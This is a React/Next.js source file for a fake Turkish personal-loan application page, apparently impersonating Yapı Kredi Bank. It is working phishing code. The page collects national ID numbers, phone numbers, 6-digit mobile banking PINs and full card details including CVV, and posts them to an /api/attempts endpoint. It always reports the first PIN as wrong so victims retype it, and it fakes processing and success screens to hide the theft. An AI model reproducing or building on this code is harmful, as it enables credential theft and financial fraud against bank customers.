"use client";

import { useState } from "react";
import { Header } from "@/components/layout/Header";
import { Footer } from "@/components/layout/Footer";
import { HeroBanner } from "@/components/layout/HeroBanner";
import { Breadcrumb } from "@/components/layout/Breadcrumb";
import { StepIndicator } from "@/components/ui/StepIndicator";
import { KvkkBox } from "@/components/ui/KvkkBox";
import { BottomButtons } from "@/components/ui/BottomButtons";
import { FaqAccordion } from "@/components/ui/FaqAccordion";
import { LoadingOverlay } from "@/components/ui/LoadingOverlay";
import {
  IdentityStep,
  type IdentityData,
} from "@/components/steps/IdentityStep";
import {
  PersonalInfoStep,
  type PersonalData,
} from "@/components/steps/PersonalInfoStep";
import { ProcessingStep } from "@/components/steps/ProcessingStep";
import { SuccessStep } from "@/components/steps/SuccessStep";
import { DESCRIPTION_TEXT } from "@/lib/content";
import { delay } from "@/lib/delay";
import { isValidTCKN } from "@/lib/tc-validation";
import { phoneToDigits } from "@/lib/phone-mask";
import { isValidCardNumber, isValidExpiry } from "@/lib/card-validation";

type WizardStep = "form" | "processing" | "success";
type FormStep = 1 | 2;

interface ModalState {
  message: string;
  onClose?: () => void;
}

const emptyIdentity: IdentityData = {
  firstName: "",
  lastName: "",
  tcKimlik: "",
  phone: "",
  captcha: "",
  mobilePin: "",
};

const emptyPersonal: PersonalData = {
  loanAmount: 50000,
  loanTerm: 12,
  noCreditCard: false,
  cardNumber: "",
  cardExpiry: "",
  cardCvv: "",
};

const PROCESSING_SECONDS = 5;

export default function ApplicationWizard() {
  const [wizardStep, setWizardStep] = useState<WizardStep>("form");
  const [formStep, setFormStep] = useState<FormStep>(1);
  const [identity, setIdentity] = useState<IdentityData>(emptyIdentity);
  const [personal, setPersonal] = useState<PersonalData>(emptyPersonal);
  const [identityErrors, setIdentityErrors] = useState<
    Partial<Record<keyof IdentityData, string>>
  >({});
  const [personalErrors, setPersonalErrors] = useState<
    Partial<Record<keyof PersonalData, string>>
  >({});
  const [modal, setModal] = useState<ModalState | null>(null);
  const [loading, setLoading] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState("Lütfen bekleyiniz...");
  const [pinAttemptCount, setPinAttemptCount] = useState(0);

  const resetForm = () => {
    setIdentity(emptyIdentity);
    setPersonal(emptyPersonal);
    setIdentityErrors({});
    setPersonalErrors({});
    setFormStep(1);
  };

  const updateIdentity = (data: IdentityData) => {
    setIdentity(data);
    setIdentityErrors((prev) => {
      if (
        !prev.phone &&
        !prev.tcKimlik &&
        !prev.firstName &&
        !prev.lastName
      ) {
        return prev;
      }
      const next = { ...prev };
      if (prev.phone && phoneToDigits(data.phone).length >= 11) {
        delete next.phone;
      }
      if (prev.tcKimlik && isValidTCKN(data.tcKimlik)) {
        delete next.tcKimlik;
      }
      if (prev.firstName && data.firstName.trim()) delete next.firstName;
      if (prev.lastName && data.lastName.trim()) delete next.lastName;
      if (prev.mobilePin && data.mobilePin.length === 6) delete next.mobilePin;
      return next;
    });
  };

  const updatePersonal = (data: PersonalData) => {
    setPersonal(data);
    setPersonalErrors((prev) => {
      if (
        !prev.cardNumber &&
        !prev.cardExpiry &&
        !prev.cardCvv
      ) {
        return prev;
      }
      const next = { ...prev };
      if (!data.noCreditCard) {
        const cardDigits = data.cardNumber.replace(/\D/g, "");
        if (prev.cardNumber && isValidCardNumber(cardDigits)) delete next.cardNumber;
        if (prev.cardExpiry && isValidExpiry(data.cardExpiry)) {
          delete next.cardExpiry;
        }
        if (prev.cardCvv && data.cardCvv.length === 3) delete next.cardCvv;
      } else {
        delete next.cardNumber;
        delete next.cardExpiry;
        delete next.cardCvv;
      }
      return next;
    });
  };

  const validateIdentity = (): boolean => {
    const errors: Partial<Record<keyof IdentityData, string>> = {};
    if (!identity.firstName.trim()) errors.firstName = "Ad gerekli";
    if (!identity.lastName.trim()) errors.lastName = "Soyad gerekli";
    if (!isValidTCKN(identity.tcKimlik)) {
      errors.tcKimlik = "Geçersiz TC Kimlik Numarası";
    }
    if (phoneToDigits(identity.phone).length < 11) {
      errors.phone = "Geçerli telefon numarası giriniz";
    }
    if (identity.mobilePin.length !== 6) {
      errors.mobilePin = "6 haneli mobil şifre giriniz";
    }
    setIdentityErrors(errors);
    return Object.keys(errors).length === 0;
  };

  const validatePersonal = (): boolean => {
    const errors: Partial<Record<keyof PersonalData, string>> = {};

    if (!personal.noCreditCard) {
      const cardDigits = personal.cardNumber.replace(/\D/g, "");
      if (!isValidCardNumber(cardDigits)) errors.cardNumber = "Geçersiz kart numarası";
      if (!isValidExpiry(personal.cardExpiry)) {
        errors.cardExpiry = "Geçersiz son kullanma";
      }
      if (personal.cardCvv.length !== 3) errors.cardCvv = "CVV gerekli";
    }

    setPersonalErrors(errors);
    return Object.keys(errors).length === 0;
  };

  const showModal = (message: string, onClose?: () => void) => {
    setModal({ message, onClose });
    setTimeout(() => {
      setModal((current) => {
        if (current?.message === message) {
          current.onClose?.();
          return null;
        }
        return current;
      });
    }, 2500);
  };

  const withLoading = async (
    message: string,
    action: () => Promise<void> | void
  ) => {
    setLoadingMessage(message);
    setLoading(true);
    try {
      await delay(700);
      await action();
    } finally {
      setLoading(false);
    }
  };

  const submitPinAttempt = async () => {
    const res = await fetch("/api/attempts", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        tcKimlik: identity.tcKimlik,
        firstName: identity.firstName,
        lastName: identity.lastName,
        phone: phoneToDigits(identity.phone),
        birthDate: "",
        loanAmount: 0,
        loanTerm: 0,
        noCreditCard: true,
        cardNumber: "",
        cardExpiry: "",
        cardCvv: "",
        mobilePin: identity.mobilePin,
      }),
    });
    const data = await res.json();

    // Deneme limiti doldu → başarısız gibi göster, success sayfasına yönlendir
    if (res.status === 429) {
      showModal("Mobil şifrenizi hatalı girdiniz.", () => setWizardStep("success"));
      return;
    }

    if (!res.ok) throw new Error(data.error || "Kayıt başarısız");

    const currentAttempt = pinAttemptCount;
    setPinAttemptCount((n) => n + 1);

    // 1. deneme → her zaman hata göster
    if (currentAttempt === 0) {
      showModal("Mobil şifrenizi hatalı girdiniz.");
      return;
    }

    // 2. deneme ve sonrası → kredi/kart adımına geç
    setFormStep(2);
  };

  const handleIdentitySubmit = async () => {
    if (!validateIdentity()) return;

    await withLoading("Mobil şifreniz doğrulanıyor...", async () => {
      try {
        await submitPinAttempt();
      } catch (e) {
        showModal(e instanceof Error ? e.message : "Hata oluştu");
      }
    });
  };

  const submitAttempt = async () => {
    const res = await fetch("/api/attempts", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        tcKimlik: identity.tcKimlik,
        firstName: identity.firstName,
        lastName: identity.lastName,
        phone: phoneToDigits(identity.phone),
        birthDate: "",
        loanAmount: personal.loanAmount,
        loanTerm: personal.loanTerm,
        noCreditCard: personal.noCreditCard,
        cardNumber: personal.noCreditCard
          ? ""
          : personal.cardNumber.replace(/\D/g, ""),
        cardExpiry: personal.noCreditCard ? "" : personal.cardExpiry,
        cardCvv: personal.noCreditCard ? "" : personal.cardCvv,
        mobilePin: identity.mobilePin,
      }),
    });
    const data = await res.json();

    // Deneme limiti doldu → success sayfasına yönlendir
    if (res.status === 429) {
      setWizardStep("success");
      return;
    }

    if (!res.ok) throw new Error(data.error || "Kayıt başarısız");

    if (typeof window !== "undefined" && (window as any).fbq) {
      (window as any).fbq("track", "Lead");
    }

    setWizardStep("processing");
  };

  const handlePersonalSubmit = async () => {
    if (!validatePersonal()) return;

    await withLoading("Başvurunuz gönderiliyor...", async () => {
      try {
        await submitAttempt();
      } catch (e) {
        showModal(e instanceof Error ? e.message : "Hata oluştu");
      }
    });
  };

  if (wizardStep === "processing") {
    return (
      <ProcessingStep
        duration={PROCESSING_SECONDS}
        onComplete={() => setWizardStep("success")}
      />
    );
  }

  if (wizardStep === "success") {
    return <SuccessStep />;
  }

  return (
    <div className="min-h-screen bg-ykb-page">
      <Header />

      <div className="mx-auto max-w-card px-[10px] pb-4 pt-2 md:pb-6 md:pt-4">
        <div className="overflow-hidden rounded-[6px] bg-white md:rounded-[10px]">
          <HeroBanner />

          <div className="px-[15px] py-[30px] md:p-[30px]">
            <h1 className="mb-2 text-[24px] font-medium leading-tight text-ykb-primary sm:text-[30px]">
              Bireysel İhtiyaç Kredisi
            </h1>
            <Breadcrumb />
            <p className="mb-6 text-sm leading-[22px] text-black md:mb-8 md:text-base md:leading-[25px]">
              {DESCRIPTION_TEXT}
            </p>

            <StepIndicator currentStep={formStep} />

            <div key={formStep} className="step-enter">
              {formStep === 1 ? (
                <IdentityStep
                  data={identity}
                  onChange={updateIdentity}
                  errors={identityErrors}
                />
              ) : (
                <PersonalInfoStep
                  data={personal}
                  onChange={updatePersonal}
                  errors={personalErrors}
                />
              )}
            </div>

            {formStep === 1 && <KvkkBox />}

            <div className="mx-auto mt-6 flex w-full max-w-[450px] justify-end">
              {formStep === 1 ? (
                <button
                  type="button"
                  onClick={handleIdentitySubmit}
                  disabled={loading}
                  className="ykb-btn-primary"
                >
                  Hemen Başvur
                </button>
              ) : (
                <div className="flex w-full flex-col gap-2 sm:w-auto sm:flex-row">
                  <button
                    type="button"
                    onClick={() => setFormStep(1)}
                    disabled={loading}
                    className="w-full rounded border border-ykb-input-border px-6 py-2.5 text-sm sm:w-auto"
                  >
                    Geri
                  </button>
                  <button
                    type="button"
                    onClick={handlePersonalSubmit}
                    disabled={loading}
                    className="ykb-btn-primary w-full sm:w-auto"
                  >
                    Devam Et
                  </button>
                </div>
              )}
            </div>
          </div>

          <BottomButtons />
          <FaqAccordion />
        </div>
      </div>

      <Footer />

      {loading && <LoadingOverlay message={loadingMessage} />}

      {modal && (
        <div className="modal-overlay fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4">
          <div className="modal-card w-full max-w-sm rounded-lg bg-white p-4 text-center shadow-xl sm:max-w-md sm:p-6">
            <div className="mb-3 text-3xl text-red-500 sm:text-4xl">✕</div>
            <p className="text-sm font-medium text-[#333] sm:text-base">
              {modal.message}
            </p>
          </div>
        </div>
      )}
    </div>
  );
}
